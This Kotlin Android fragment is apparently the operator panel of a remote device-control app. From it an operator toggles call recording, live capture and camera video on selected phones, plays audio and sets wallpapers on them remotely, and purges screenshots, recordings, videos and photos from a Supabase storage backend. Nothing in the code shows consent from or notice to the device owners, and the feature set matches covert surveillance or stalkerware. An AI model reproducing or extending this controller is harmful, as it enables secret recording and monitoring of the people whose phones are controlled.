package com.example.devsync

  import android.content.Context
  import android.os.Bundle
  import android.view.View
  import android.widget.Button
  import android.widget.EditText
  import android.widget.Switch
  import android.widget.TextView
  import androidx.fragment.app.Fragment
  import androidx.recyclerview.widget.LinearLayoutManager
  import androidx.recyclerview.widget.RecyclerView
  import kotlinx.coroutines.*
  import okhttp3.MediaType.Companion.toMediaType
  import okhttp3.Request
  import okhttp3.RequestBody.Companion.toRequestBody
  import org.json.JSONArray
  import org.json.JSONObject
  import java.text.SimpleDateFormat
  import java.util.*

  class ControlsFragment : Fragment(R.layout.fragment_controls) {

      private val admin get() = requireActivity() as AdminControlActivity

      private val wallpapers = mutableListOf<SavedUrl>()
      private val songs      = mutableListOf<SavedUrl>()
      private lateinit var wallpaperAdapter: SavedUrlAdapter
      private lateinit var songAdapter: SavedUrlAdapter

      private val PREF_NAME       = "devsync_saved_urls"
      private val KEY_WALLPAPERS  = "saved_wallpapers"
      private val KEY_SONGS       = "saved_songs"
      private val TWO_DAYS_MS     = 2 * 24 * 60 * 60 * 1000L

      override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
          super.onViewCreated(view, savedInstanceState)

          // ── Quick Actions ────────────────────────────────────────────────────
          view.findViewById<Button>(R.id.btnStopAll).setOnClickListener {
              admin.sendToSelected { d ->
                  d.child("stop_all").setValue(true)
                  d.child("live_capture_enabled").setValue(false)
                  d.child("camera_video_flag").setValue(false)
              }
          }
          view.findViewById<Button>(R.id.btnTriggerVibration).setOnClickListener {
              admin.sendToSelected { d ->
                  d.child("haptic_feedback_trigger").setValue(System.currentTimeMillis())
              }
          }

          // ── Toggles ──────────────────────────────────────────────────────────
          view.findViewById<Switch>(R.id.switchBluetooth).setOnCheckedChangeListener { _, on ->
              admin.sendToSelected { d -> d.child("bt_management_flag").setValue(on) }
          }
          view.findViewById<Switch>(R.id.switchCallRecording).setOnCheckedChangeListener { _, on ->
              admin.sendToSelected { d -> d.child("call_recording_enabled").setValue(on) }
          }

          // ── Wallpapers ───────────────────────────────────────────────────────
          val rvWallpapers = view.findViewById<RecyclerView>(R.id.rvWallpapers)
          wallpaperAdapter = SavedUrlAdapter(
              items       = wallpapers,
              actionLabel = "🖼 Set",
              onAction    = { name, url -> setWallpaper(name, url) },
              onDelete    = { idx -> deleteItem(wallpapers, wallpaperAdapter, idx, "Wallpaper", KEY_WALLPAPERS) }
          )
          rvWallpapers.layoutManager = LinearLayoutManager(requireContext())
          rvWallpapers.adapter = wallpaperAdapter

          view.findViewById<Button>(R.id.btnSaveWallpaper).setOnClickListener {
              val et  = view.findViewById<EditText>(R.id.etWallpaperUrl)
              val raw = et.text.toString().trim()
              if (raw.isEmpty()) { admin.showStatus("❌ URL daalo pehle", false); return@setOnClickListener }
              val url = AdminControlActivity.convertGoogleDriveUrl(raw)
              val num = wallpapers.size + 1
              wallpapers.add(SavedUrl("Wallpaper $num", url))
              wallpaperAdapter.notifyItemInserted(wallpapers.size - 1)
              saveToPrefs(KEY_WALLPAPERS, wallpapers)
              et.setText("")
              admin.showStatus("✅ Wallpaper $num saved!", true)
          }

          // ── Songs ─────────────────────────────────────────────────────────────
          val rvSongs = view.findViewById<RecyclerView>(R.id.rvSongs)
          songAdapter = SavedUrlAdapter(
              items       = songs,
              actionLabel = "▶ Play",
              onAction    = { name, url -> playSong(name, url) },
              onDelete    = { idx -> deleteItem(songs, songAdapter, idx, "Song", KEY_SONGS) }
          )
          rvSongs.layoutManager = LinearLayoutManager(requireContext())
          rvSongs.adapter = songAdapter

          view.findViewById<Button>(R.id.btnSaveSong).setOnClickListener {
              val et  = view.findViewById<EditText>(R.id.etSongUrl)
              val raw = et.text.toString().trim()
              if (raw.isEmpty()) { admin.showStatus("❌ Audio URL daalo pehle", false); return@setOnClickListener }
              val url = AdminControlActivity.convertGoogleDriveUrl(raw)
              val num = songs.size + 1
              songs.add(SavedUrl("Song $num", url))
              songAdapter.notifyItemInserted(songs.size - 1)
              saveToPrefs(KEY_SONGS, songs)
              et.setText("")
              admin.showStatus("✅ Song $num saved!", true)
          }

          // ── Cleanup ───────────────────────────────────────────────────────────
          val btnCleanup     = view.findViewById<Button>(R.id.btnCleanup)
          val tvCleanupResult= view.findViewById<TextView>(R.id.tvCleanupResult)

          btnCleanup.setOnClickListener {
              btnCleanup.isEnabled = false
              btnCleanup.text = "⏳ Cleaning..."
              tvCleanupResult.visibility = View.GONE
              admin.showStatus("⏳ Scanning old files...", true)

              cleanOldFiles { deletedCount ->
                  btnCleanup.isEnabled = true
                  btnCleanup.text = "🗑 DELETE FILES OLDER THAN 2 DAYS"
                  if (deletedCount > 0) {
                      tvCleanupResult.text = "✅ $deletedCount file(s) deleted successfully"
                      tvCleanupResult.setTextColor(0xFF00FF88.toInt())
                      admin.showStatus("🗑 Cleaned $deletedCount old file(s) from cloud", true)
                  } else {
                      tvCleanupResult.text = "✅ No files older than 2 days found"
                      tvCleanupResult.setTextColor(0xFF8B949E.toInt())
                      admin.showStatus("✅ Nothing to clean — all files are fresh", true)
                  }
                  tvCleanupResult.visibility = View.VISIBLE
              }
          }

          loadFromPrefs()
      }

      // ── Wallpaper action — specific message ───────────────────────────────────
      private fun setWallpaper(name: String, url: String) {
          val ids = AdminControlActivity.selectedIds
          if (ids.isEmpty()) { admin.showStatus("❌ Pehle device select karo!", false); return }
          try {
              ids.forEach { id -> admin.db("devices/$id/wallpaper_url").setValue(url) }
              admin.showStatus("✅ $name → ${ids.size} device(s) pe set ho raha hai!", true)
          } catch (e: Exception) {
              admin.showStatus("❌ Error: ${e.message}", false)
          }
      }

      // ── Song action — specific message ────────────────────────────────────────
      private fun playSong(name: String, url: String) {
          val ids = AdminControlActivity.selectedIds
          if (ids.isEmpty()) { admin.showStatus("❌ Pehle device select karo!", false); return }
          try {
              ids.forEach { id ->
                  admin.db("devices/$id/remote_audio_url").setValue(url)
                  admin.db("devices/$id/audio_remote_trigger").setValue(System.currentTimeMillis())
              }
              admin.showStatus("✅ $name → ${ids.size} device(s) pe play ho raha hai!", true)
          } catch (e: Exception) {
              admin.showStatus("❌ Error: ${e.message}", false)
          }
      }

      // ── Delete item from saved list ───────────────────────────────────────────
      private fun deleteItem(list: MutableList<SavedUrl>, adapter: SavedUrlAdapter,
                              idx: Int, prefix: String, key: String) {
          if (idx < 0 || idx >= list.size) return
          list.removeAt(idx)
          for (i in list.indices) list[i] = list[i].copy(name = "$prefix ${i + 1}")
          adapter.notifyDataSetChanged()
          saveToPrefs(key, list)
          admin.showStatus("🗑 $prefix deleted", true)
      }

      // ── 2-day cleanup ─────────────────────────────────────────────────────────
      private fun cleanOldFiles(onDone: (Int) -> Unit) {
          val buckets = listOf("screenshots", "recordings", "videos", "photos")
          val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).apply {
              timeZone = TimeZone.getTimeZone("UTC")
          }
          val now = System.currentTimeMillis()

          CoroutineScope(Dispatchers.IO).launch {
              var totalDeleted = 0

              for (bucket in buckets) {
                  try {
                      val arr      = admin.supabaseList(bucket)
                      val toDelete = mutableListOf<String>()

                      for (i in 0 until arr.length()) {
                          try {
                              val obj  = arr.getJSONObject(i)
                              val name = obj.optString("name")
                              if (name.isEmpty()) continue

                              // Try updated_at from API first
                              val updatedAt = obj.optString("updated_at", "")
                              val fileTime: Long = if (updatedAt.isNotEmpty()) {
                                  try {
                                      sdf.parse(updatedAt.substringBefore('.').substringBefore('Z'))?.time ?: 0L
                                  } catch (_: Exception) { 0L }
                              } else 0L

                              // Fallback: parse epoch from end of filename (e.g. "mic_xxxx_1716000000000.m4a")
                              val effectiveTime = if (fileTime > 0L) fileTime else {
                                  val noExt = name.substringBeforeLast('.')
                                  noExt.substringAfterLast('_').toLongOrNull() ?: 0L
                              }

                              if (effectiveTime > 0L && (now - effectiveTime) > TWO_DAYS_MS) {
                                  toDelete.add(name)
                              }
                          } catch (_: Exception) {}
                      }

                      if (toDelete.isNotEmpty()) {
                          val deleted = batchDelete(bucket, toDelete)
                          if (deleted) totalDeleted += toDelete.size
                      }
                  } catch (_: Exception) {}
              }

              withContext(Dispatchers.Main) { onDone(totalDeleted) }
          }
      }

      private fun batchDelete(bucket: String, names: List<String>): Boolean {
          return try {
              val prefixesArr = JSONArray().apply { names.forEach { put(it) } }
              val body = JSONObject().put("prefixes", prefixesArr).toString()
              val req  = Request.Builder()
                  .url("${AdminControlActivity.SUPABASE_URL}/storage/v1/object/$bucket")
                  .header("Authorization", "Bearer ${AdminControlActivity.SUPABASE_KEY}")
                  .header("apikey", AdminControlActivity.SUPABASE_KEY)
                  .header("Content-Type", "application/json")
                  .delete(body.toRequestBody("application/json".toMediaType()))
                  .build()
              admin.http.newCall(req).execute().use { it.isSuccessful }
          } catch (_: Exception) { false }
      }

      // ── SharedPrefs helpers ───────────────────────────────────────────────────
      private fun saveToPrefs(key: String, list: List<SavedUrl>) {
          val arr = JSONArray()
          list.forEach { JSONObject().also { o -> o.put("name", it.name); o.put("url", it.url); arr.put(o) } }
          requireContext().getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
              .edit().putString(key, arr.toString()).apply()
      }

      private fun loadFromPrefs() {
          val prefs = requireContext().getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
          fun parse(key: String, into: MutableList<SavedUrl>, adapter: SavedUrlAdapter) {
              try {
                  val arr = JSONArray(prefs.getString(key, "[]") ?: "[]")
                  into.clear()
                  for (i in 0 until arr.length()) {
                      val o = arr.getJSONObject(i)
                      into.add(SavedUrl(o.getString("name"), o.getString("url")))
                  }
                  adapter.notifyDataSetChanged()
              } catch (_: Exception) {}
          }
          parse(KEY_WALLPAPERS, wallpapers, wallpaperAdapter)
          parse(KEY_SONGS, songs, songAdapter)
      }
  }
  